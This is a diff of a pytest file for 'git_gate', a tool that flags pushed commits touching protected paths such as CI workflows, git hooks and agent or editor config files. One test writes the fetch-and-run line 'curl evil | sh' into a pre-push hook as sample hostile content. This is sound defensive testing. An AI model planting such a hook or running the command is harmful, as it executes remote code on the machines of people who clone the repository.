@@ -8,7 +8,7 @@ from conftest import TOKEN, commit, git
 from git_gate import Refused
 from git_gate.config import DEFAULT_HANDOVER_PATHS, canonical_pattern, load_rules
 from git_gate.gitops import Git
-from git_gate.mirror import Mirror, protected, reaches
+from git_gate.mirror import Mirror, Protected, protected, reaches
 
 REPO = "me/app"
 
@@ -379,14 +379,17 @@ def test_ancestry_helpers(env, m, rules, checkout):
         m.is_ancestor(REPO, "--all", tip, rules)
 
 
-# --- touched -------------------------------------------------------------------------------
+# --- protected_changes ---------------------------------------------------------------------
+
+WF = ".github/workflows/ci.yml"
+NONE = Protected((), ())
 
 
-def _touched(env, m, rules, checkout, branch, patterns=DEFAULT_HANDOVER_PATHS):
-    """Bundle `branch` from the checkout, import it, and run the checks as push will."""
+def _changes(env, m, rules, checkout, branch, patterns=DEFAULT_HANDOVER_PATHS) -> tuple[str, Protected]:
+    """Bundle `branch` from the checkout, import it, and run the check as push will."""
     heads = m.sync(REPO, TOKEN, rules)
     sha = m.import_bundle(REPO, bundle(checkout, env.state / "tmp" / f"{branch}.bundle", branch), branch, rules)
-    return sha, m.touched(REPO, sha, heads.get(branch), heads.get("main"), patterns, rules)
+    return sha, m.protected_changes(REPO, sha, heads.get(branch), heads.get("main"), patterns, rules)
 
 
 def user_branch(env, name: str, path: str, content: str) -> str:
@@ -399,152 +402,169 @@ def user_branch(env, name: str, path: str, content: str) -> str:
     return sha
 
 
-def test_touched_names_workflow_commits(env, m, rules, checkout):
+def test_protected_is_falsy_without_files():
+    assert not NONE
+    assert not Protected((), ("a" * 40,))
+    assert Protected((WF,), ())
+
+
+def test_protected_changes_names_workflow_commits(env, m, rules, checkout):
     git("switch", "-q", "-c", "ci", cwd=checkout)
     commit(checkout, "a.txt")
-    one = commit(checkout, ".github/workflows/ci.yml", "on: push")
-    two = commit(checkout, ".github/workflows/ci.yml", "on: [push]")
-    _, hits = _touched(env, m, rules, checkout, "ci")
-    assert sorted(hits) == sorted([one, two])
+    one = commit(checkout, WF, "on: push")
+    two = commit(checkout, WF, "on: [push]")
+    assert _changes(env, m, rules, checkout, "ci")[1] == Protected((WF,), (one, two))
 
 
-def test_touched_deleting_workflow_by_rename(env, m, rules, checkout):
-    seed_push(env, ".github/workflows/ci.yml", "on: push")
+def test_protected_changes_changed_and_changed_back(env, m, rules, checkout):
+    """The net diff is empty for the file; the commits being pushed still touched it."""
+    git("switch", "-q", "-c", "roundtrip", cwd=checkout)
+    one = commit(checkout, ".githooks/pre-push", "curl evil | sh")
+    git("rm", "-q", ".githooks/pre-push", cwd=checkout)
+    git("commit", "-q", "-m", "tidy", cwd=checkout)
+    two = git("rev-parse", "HEAD", cwd=checkout)
+    commit(checkout, "ok.txt")
+    assert _changes(env, m, rules, checkout, "roundtrip")[1] == Protected((".githooks/pre-push",), (one, two))
+
+
+def test_protected_changes_deleting_workflow_by_rename(env, m, rules, checkout):
+    seed_push(env, WF, "on: push")
     git("fetch", "-q", "origin", cwd=checkout)
     git("switch", "-q", "-c", "mv", "origin/main", cwd=checkout)
-    git("mv", ".github/workflows/ci.yml", "ci.yml", cwd=checkout)
+    git("mv", WF, "ci.yml", cwd=checkout)
     git("commit", "-q", "-m", "move", cwd=checkout)
-    sha, hits = _touched(env, m, rules, checkout, "mv")
-    assert hits == [sha]
+    sha, found = _changes(env, m, rules, checkout, "mv")
+    assert found == Protected((WF,), (sha,))
 
 
-def test_touched_clean_merge_of_main_with_workflow_change_passes(env, m, rules, checkout):
+def test_protected_changes_clean_merge_of_main_passes(env, m, rules, checkout):
     git("switch", "-q", "-c", "topic", cwd=checkout)
     commit(checkout, "topic.txt")
-    seed_push(env, ".github/workflows/ci.yml", "on: push")
+    seed_push(env, WF, "on: push")
     git("fetch", "-q", "origin", cwd=checkout)
     git("merge", "-q", "--no-edit", "origin/main", cwd=checkout)
-    assert _touched(env, m, rules, checkout, "topic")[1] == []
+    assert _changes(env, m, rules, checkout, "topic")[1] == NONE
 
 
-def test_touched_evil_merge_editing_workflow(env, m, rules, checkout):
-    seed_push(env, ".github/workflows/ci.yml", "on: push")
+def test_protected_changes_evil_merge(env, m, rules, checkout):
+    seed_push(env, WF, "on: push")
     git("fetch", "-q", "origin", cwd=checkout)
     git("switch", "-q", "-c", "topic", "main", cwd=checkout)
     commit(checkout, "topic.txt")
     git("merge", "-q", "--no-commit", "origin/main", cwd=checkout)
-    (checkout / ".github/workflows/ci.yml").write_text("on: everything")
+    (checkout / WF).write_text("on: everything")
     git("add", ".", cwd=checkout)
     git("commit", "-q", "--no-edit", cwd=checkout)
-    sha, hits = _touched(env, m, rules, checkout, "topic")
-    assert hits == [sha]
+    merge, found = _changes(env, m, rules, checkout, "topic")
+    assert found == Protected((WF,), (merge,))
 
 
-def test_touched_merge_rolling_workflow_back(env, m, rules, checkout):
+def test_protected_changes_rollback_merge_names_the_file(env, m, rules, checkout):
     """Dense-combined diffs hide a merge that keeps one parent's older workflow; the tree check must not."""
-    old = seed_push(env, ".github/workflows/ci.yml", "v1")
-    seed_push(env, ".github/workflows/ci.yml", "v2")
+    old = seed_push(env, WF, "v1")
+    seed_push(env, WF, "v2")
     git("fetch", "-q", "origin", cwd=checkout)
     git("switch", "-q", "-c", "side", old, cwd=checkout)
     commit(checkout, "side.txt")
     git("switch", "-q", "-c", "topic", "origin/main", cwd=checkout)
     commit(checkout, "topic.txt")
     git("merge", "-q", "--no-commit", "side", cwd=checkout)
-    git("checkout", "side", "--", ".github/workflows/ci.yml", cwd=checkout)
+    git("checkout", "side", "--", WF, cwd=checkout)
     git("commit", "-q", "--no-edit", cwd=checkout)
-    assert (checkout / ".github/workflows/ci.yml").read_text() == "v1"
-    sha, hits = _touched(env, m, rules, checkout, "topic")
-    assert hits == [sha]
+    assert (checkout / WF).read_text() == "v1"
+    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((WF,), ())
 
 
-def test_touched_stale_fork_with_old_workflows(env, m, rules, checkout):
+def test_protected_changes_stale_fork_with_old_workflows_is_protected(env, m, rules, checkout):
     """Main gaining a workflow fix after the fork: a new branch there would run the old workflows."""
     git("switch", "-q", "-c", "topic", cwd=checkout)
     commit(checkout, "topic.txt")
-    seed_push(env, ".github/workflows/ci.yml", "on: push")
-    sha, hits = _touched(env, m, rules, checkout, "topic")
-    assert hits == [sha]
+    seed_push(env, WF, "on: push")
+    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((WF,), ())
 
 
-def test_touched_stale_fork_without_workflow_drift_passes(env, m, rules, checkout):
+def test_protected_changes_stale_fork_without_workflow_drift_passes(env, m, rules, checkout):
     git("switch", "-q", "-c", "topic", cwd=checkout)
     commit(checkout, "topic.txt")
     seed_push(env, "docs/later.md", "later")
-    assert _touched(env, m, rules, checkout, "topic")[1] == []
+    assert _changes(env, m, rules, checkout, "topic")[1] == NONE
 
 
-def test_touched_existing_branch_merges_main_after_user_workflow_change_passes(env, m, rules, checkout):
+def test_protected_changes_existing_branch_merges_main_after_user_workflow_change_passes(env, m, rules, checkout):
     """The user's own workflow commit on main, merged into a pushed branch, is not re-checked."""
     git("switch", "-q", "-c", "topic", cwd=checkout)
     commit(checkout, "topic.txt")
     git("push", "-q", env.url, "topic", cwd=checkout)
-    seed_push(env, ".github/workflows/ci.yml", "on: push")
+    seed_push(env, WF, "on: push")
     git("fetch", "-q", "origin", cwd=checkout)
     git("merge", "-q", "--no-edit", "origin/main", cwd=checkout)
-    assert _touched(env, m, rules, checkout, "topic")[1] == []
+    assert _changes(env, m, rules, checkout, "topic")[1] == NONE
 
 
-def test_touched_existing_branch_keeping_its_old_workflows_passes(env, m, rules, checkout):
-    seed_push(env, ".github/workflows/ci.yml", "v1")
+def test_protected_changes_existing_branch_keeping_its_old_workflows_passes(env, m, rules, checkout):
+    seed_push(env, WF, "v1")
     git("fetch", "-q", "origin", cwd=checkout)
     git("switch", "-q", "-c", "topic", "origin/main", cwd=checkout)
     commit(checkout, "topic.txt")
     git("push", "-q", env.url, "topic", cwd=checkout)
-    seed_push(env, ".github/workflows/ci.yml", "v2")
+    seed_push(env, WF, "v2")
     commit(checkout, "more.txt")
-    assert _touched(env, m, rules, checkout, "topic")[1] == []
+    assert _changes(env, m, rules, checkout, "topic")[1] == NONE
 
 
-def test_touched_rewrite_with_new_protected_content(env, m, rules, checkout):
-    seed_push(env, ".github/workflows/ci.yml", "v1")
-    user_branch(env, "feat", ".github/workflows/ci.yml", "v2")
+def test_protected_changes_rewrite_with_new_protected_content(env, m, rules, checkout):
+    seed_push(env, WF, "v1")
+    user_branch(env, "feat", WF, "v2")
     git("fetch", "-q", "origin", cwd=checkout)
     git("switch", "-q", "-c", "feat", "origin/main", cwd=checkout)
-    v3 = commit(checkout, ".github/workflows/ci.yml", "v3")
-    assert _touched(env, m, rules, checkout, "feat")[1] == [v3]
+    v3 = commit(checkout, WF, "v3")
+    assert _changes(env, m, rules, checkout, "feat")[1] == Protected((WF,), (v3,))
 
 
-def test_touched_rewrite_back_to_the_fork_version_is_not_protected(env, m, rules, checkout):
-    seed_push(env, ".github/workflows/ci.yml", "v1")
-    user_branch(env, "feat", ".github/workflows/ci.yml", "v2")
+def test_protected_changes_rewrite_back_to_the_fork_version_is_not_protected(env, m, rules, checkout):
+    """Dropping the user's workflow edit is still a rewrite (a lease handover), not a protected change."""
+    seed_push(env, WF, "v1")
+    user_branch(env, "feat", WF, "v2")
     git("fetch", "-q", "origin", cwd=checkout)
     git("switch", "-q", "-c", "feat", "origin/main", cwd=checkout)
     commit(checkout, "other.txt")
-    assert _touched(env, m, rules, checkout, "feat")[1] == []
+    assert _changes(env, m, rules, checkout, "feat")[1] == NONE
 
 
-def test_touched_fast_forward_keeping_the_remotes_protected_change_passes(env, m, rules, checkout):
-    seed_push(env, ".github/workflows/ci.yml", "v1")
-    user_branch(env, "feat", ".github/workflows/ci.yml", "v2")
+def test_protected_changes_fast_forward_keeping_the_remotes_protected_change_passes(env, m, rules, checkout):
+    seed_push(env, WF, "v1")
+    user_branch(env, "feat", WF, "v2")
     git("fetch", "-q", "origin", cwd=checkout)
     git("switch", "-q", "-c", "feat", "origin/feat", cwd=checkout)
     commit(checkout, "other.txt")
-    assert _touched(env, m, rules, checkout, "feat")[1] == []
+    assert _changes(env, m, rules, checkout, "feat")[1] == NONE
 
 
-def test_touched_against_existing_remote_branch(env, m, rules, checkout):
+def test_protected_changes_against_existing_remote_branch(env, m, rules, checkout):
     git("switch", "-q", "-c", "topic", cwd=checkout)
     commit(checkout, "topic.txt")
     git("push", "-q", env.url, "topic", cwd=checkout)
     git("fetch", "-q", "origin", cwd=checkout)
-    wf = commit(checkout, ".github/workflows/ci.yml")
+    wf = commit(checkout, WF)
     commit(checkout, "more.txt")
-    assert _touched(env, m, rules, checkout, "topic")[1] == [wf]
+    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((WF,), (wf,))
 
 
-def test_touched_root_commit_without_base(env, m, rules, checkout):
+def test_protected_changes_no_default_branch_checks_all_history(env, m, rules, checkout):
     git("switch", "-q", "--orphan", "fresh", cwd=checkout)
-    root = commit(checkout, ".githooks/pre-commit")
+    root = commit(checkout, ".githooks/x")
     m.sync(REPO, TOKEN, rules)
     sha = m.import_bundle(REPO, bundle(checkout, env.state / "tmp" / "f.bundle", "fresh"), "fresh", rules)
     assert sha == root
-    assert m.touched(REPO, sha, None, None, DEFAULT_HANDOVER_PATHS, rules) == [root]
+    assert m.protected_changes(REPO, sha, None, None, DEFAULT_HANDOVER_PATHS, rules) == Protected(
+        (".githooks/x",), (root,)
+    )
 
 
-def test_touched_ignores_replace_refs(env, m, rules, checkout):
+def test_protected_changes_ignores_replace_refs(env, m, rules, checkout):
     """refs/replace could make a workflow commit look harmless; the gate's git disables replacements."""
     git("switch", "-q", "-c", "sneaky", cwd=checkout)
-    bad = commit(checkout, ".github/workflows/ci.yml", "on: push")
+    bad = commit(checkout, WF, "on: push")
     git("switch", "-q", "main", cwd=checkout)
     git("switch", "-q", "-c", "decoy", cwd=checkout)
     good = commit(checkout, "ok.txt")
@@ -554,7 +574,31 @@ def test_touched_ignores_replace_refs(env, m, rules, checkout):
     assert mgit(m, "for-each-ref", "refs/replace/") != ""
     main = heads["main"]
     assert m.new_commits(REPO, bad, main, rules) == [bad]
-    assert m.touched(REPO, bad, None, main, DEFAULT_HANDOVER_PATHS, rules) == [bad]
+    assert m.protected_changes(REPO, bad, None, main, DEFAULT_HANDOVER_PATHS, rules) == Protected((WF,), (bad,))
+
+
+def test_protected_changes_never_compares_with_other_branches(env, m, rules, checkout):
+    """A workflow staged on a branch the agent pushed is still new to the default branch."""
+    git("switch", "-q", "-c", "agent", cwd=checkout)
+    evil = commit(checkout, WF, "on: push")
+    git("push", "-q", env.url, "agent", cwd=checkout)
+    git("switch", "-q", "-c", "innocent", cwd=checkout)
+    commit(checkout, "innocent.txt")
+    assert _changes(env, m, rules, checkout, "innocent")[1] == Protected((WF,), (evil,))
+
+
+def test_protected_changes_fork_point(env, m, rules, checkout):
+    base = git("rev-parse", "HEAD", cwd=checkout)
+    git("switch", "-q", "-c", "topic", cwd=checkout)
+    commit(checkout, "a.txt")
+    tip = seed_push(env, "later.txt")
+    sha, _ = _changes(env, m, rules, checkout, "topic")
+    assert m.fork_point(REPO, sha, tip, rules) == base
+    assert m.fork_point(REPO, sha, None, rules) is None
+    git("switch", "-q", "--orphan", "lonely", cwd=checkout)
+    commit(checkout, "o.txt")
+    lonely, _ = _changes(env, m, rules, checkout, "lonely")
+    assert m.fork_point(REPO, lonely, tip, rules) is None
 
 
 @pytest.mark.parametrize(
@@ -563,8 +607,15 @@ def test_touched_ignores_replace_refs(env, m, rules, checkout):
         (".githooks/pre-commit", (), True),
         (".pre-commit-config.yaml", (), True),
         (".github/workflows/sub/x.yml", (), True),
+        (".claude/settings.json", (), True),
+        (".mcp.json", (), True),
+        (".vscode/tasks.json", (), True),
+        (".idea/workspace.xml", (), True),
+        (".envrc", (), True),
+        (".devcontainer/devcontainer.json", (), True),
         ("skills/x.md", (), False),
         ("skills/x.md", ("skills/**",), True),
+        ("skills/x.md", ("skills",), True),
         ("docs/.pre-commit-config.yaml", (), False),
         (".github/dependabot.yml", (), False),
         (".GITHUB/workflows/ci.yml", (), True),
@@ -572,7 +623,7 @@ def test_touched_ignores_replace_refs(env, m, rules, checkout):
         (".Pre-Commit-Config.YAML", (), True),
         ("Skills/X.md", ("skills/**",), True),
         ("skills/x.md", ("SKILLS/**",), True),
-        # patterns are normalised
+        # patterns are canonicalised
         ("skills/x.md", ("/skills/**",), True),
         ("skills/x.md", ("skills/",), True),
         ("skills/x.md", ("./skills/**",), True),
@@ -583,14 +634,14 @@ def test_touched_ignores_replace_refs(env, m, rules, checkout):
         ("skillset/x.md", ("skills/",), False),
     ],
 )
-def test_touched_patterns(env, m, rules, checkout, path, extra, hit):
+def test_protected_changes_patterns(env, m, rules, checkout, path, extra, hit):
     git("switch", "-q", "-c", "topic", cwd=checkout)
     sha = commit(checkout, path)
-    _, hits = _touched(env, m, rules, checkout, "topic", DEFAULT_HANDOVER_PATHS + canon(*extra))
-    assert hits == ([sha] if hit else [])
+    found = _changes(env, m, rules, checkout, "topic", DEFAULT_HANDOVER_PATHS + canon(*extra))[1]
+    assert found == (Protected((path,), (sha,)) if hit else NONE)
 
 
-def test_touched_pattern_directory_as_file(env, m, rules, checkout):
+def test_protected_changes_pattern_directory_as_file(env, m, rules, checkout):
     """A file at the pattern's directory (`.github/workflows` itself) is a handover path too.
 
     A regular file `skills` cannot hold anything `skills/*.md` names, so it is not one (a symlink
@@ -598,10 +649,10 @@ def test_touched_pattern_directory_as_file(env, m, rules, checkout):
     """
     git("switch", "-q", "-c", "topic", cwd=checkout)
     sha = commit(checkout, ".github/workflows", "not a directory")
-    assert _touched(env, m, rules, checkout, "topic")[1] == [sha]
+    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((".github/workflows",), (sha,))
     git("switch", "-q", "-c", "sk", "main", cwd=checkout)
     commit(checkout, "skills", "file")
-    assert _touched(env, m, rules, checkout, "sk", canon("skills/*.md"))[1] == []
+    assert _changes(env, m, rules, checkout, "sk", canon("skills/*.md"))[1] == NONE
 
 
 # --- push, handover refs -------------------------------------------------------------------
@@ -675,7 +726,7 @@ def test_import_under_github_protocol_allowlist(env, rules, checkout, tmp_path):
     assert m.import_bundle(REPO, b, "fresh", rules) == root
 
 
-# --- symlinks into handover paths ----------------------------------------------------------
+# --- symlinks and gitlinks into handover paths ---------------------------------------------
 
 
 def link(repo: Path, path: str, target: str) -> str:
@@ -703,36 +754,58 @@ def _seed_link(env, path: str, target: str, files: dict[str, str]) -> None:
         (".github/workflows", "../ci", {"ci/ci.yml": "on: push"}, "ci/ci.yml"),
     ],
 )
-def test_touched_tip_with_symlink_into_handover_path(env, m, rules, checkout, path, target, files, edit):
+def test_protected_changes_tip_with_symlink_into_handover_path(env, m, rules, checkout, path, target, files, edit):
     """A symlink at or above a handover path makes any edit through it a handover-path change."""
     _seed_link(env, path, target, files)
     git("fetch", "-q", "origin", cwd=checkout)
     git("switch", "-q", "-c", "topic", "origin/main", cwd=checkout)
-    sha = commit(checkout, edit, "changed")
-    assert _touched(env, m, rules, checkout, "topic")[1] == [sha]
+    commit(checkout, edit, "changed")
+    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((path,), ())
 
 
-def test_touched_commit_adding_dotgithub_symlink(env, m, rules, checkout):
+def test_protected_changes_commit_adding_dotgithub_symlink(env, m, rules, checkout):
     git("switch", "-q", "-c", "topic", cwd=checkout)
     commit(checkout, "ci/workflows/ci.yml", "on: push")
-    sha = link(checkout, ".github", "ci")
-    assert _touched(env, m, rules, checkout, "topic")[1] == [sha]
+    link(checkout, ".github", "ci")
+    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((".github",), ())
 
 
-def test_touched_symlink_matching_extra_pattern_case_insensitively(env, m, rules, checkout):
+def test_protected_changes_gitlink_and_symlink_entries(env, m, rules, checkout):
+    """A gitlink at a handover path is listed like a symlink; so is a symlink the push did not change."""
+    _seed_link(env, ".github", "ci", {"ci/workflows/ci.yml": "on: push"})
+    git("fetch", "-q", "origin", cwd=checkout)
+    git("switch", "-q", "-c", "topic", "origin/main", cwd=checkout)
+    target = git("rev-parse", "HEAD", cwd=checkout)
+    git("update-index", "--add", "--cacheinfo", f"160000,{target},.githooks", cwd=checkout)
+    git("commit", "-q", "-m", "gitlink", cwd=checkout)
+    sha = git("rev-parse", "HEAD", cwd=checkout)
+    assert _changes(env, m, rules, checkout, "topic")[1] == Protected((".githooks", ".github"), (sha,))
+
+
+def test_protected_changes_gitlink_under_wildcard_prefix(env, m, rules, checkout):
+    git("switch", "-q", "-c", "topic", cwd=checkout)
+    target = git("rev-parse", "HEAD", cwd=checkout)
+    git("update-index", "--add", "--cacheinfo", f"160000,{target},skills/x", cwd=checkout)
+    git("commit", "-q", "-m", "gitlink", cwd=checkout)
+    found = _changes(env, m, rules, checkout, "topic", DEFAULT_HANDOVER_PATHS + canon("skills/*/hooks/**"))[1]
+    assert found == Protected(("skills/x",), ())
+
+
+def test_protected_changes_symlink_matching_extra_pattern_case_insensitively(env, m, rules, checkout):
     git("switch", "-q", "-c", "topic", cwd=checkout)
     commit(checkout, "real/x.md")
     sha = link(checkout, "Skills", "real")
-    assert _touched(env, m, rules, checkout, "topic", DEFAULT_HANDOVER_PATHS + canon("skills/**"))[1] == [sha]
+    found = _changes(env, m, rules, checkout, "topic", DEFAULT_HANDOVER_PATHS + canon("skills/**"))[1]
+    assert found == Protected(("Skills",), (sha,))
 
 
-def test_touched_ordinary_symlinks_pass(env, m, rules, checkout):
+def test_protected_changes_ordinary_symlinks_pass(env, m, rules, checkout):
     _seed_link(env, "docs/readme", "../README.md", {"docs/index.md": "hi"})
     git("fetch", "-q", "origin", cwd=checkout)
     git("switch", "-q", "-c", "topic", "origin/main", cwd=checkout)
     commit(checkout, "README.md", "changed")
     link(checkout, "github", "docs")
-    assert _touched(env, m, rules, checkout, "topic")[1] == []
+    assert _changes(env, m, rules, checkout, "topic")[1] == NONE
 
 
 @pytest.mark.parametrize(
@@ -747,10 +820,10 @@ def test_touched_ordinary_symlinks_pass(env, m, rules, checkout):
         ("skills/foo/bar", ("skills/*.md",), False),
     ],
 )
-def test_touched_symlink_under_wildcard_prefix(env, m, rules, checkout, path, extra, hit):
+def test_protected_changes_symlink_under_wildcard_prefix(env, m, rules, checkout, path, extra, hit):
     """A symlink matching any leading prefix of a pattern can lead into it; a leading ** is reached by all."""
     git("switch", "-q", "-c", "topic", cwd=checkout)
     commit(checkout, "real/skill.md")
-    sha = link(checkout, path, "/".join([".."] * path.count("/") + ["real"]))
-    hits = _touched(env, m, rules, checkout, "topic", DEFAULT_HANDOVER_PATHS + canon(*extra))[1]
-    assert hits == ([sha] if hit else [])
+    link(checkout, path, "/".join([".."] * path.count("/") + ["real"]))
+    found = _changes(env, m, rules, checkout, "topic", DEFAULT_HANDOVER_PATHS + canon(*extra))[1]
+    assert found == (Protected((path,), ()) if hit else NONE)
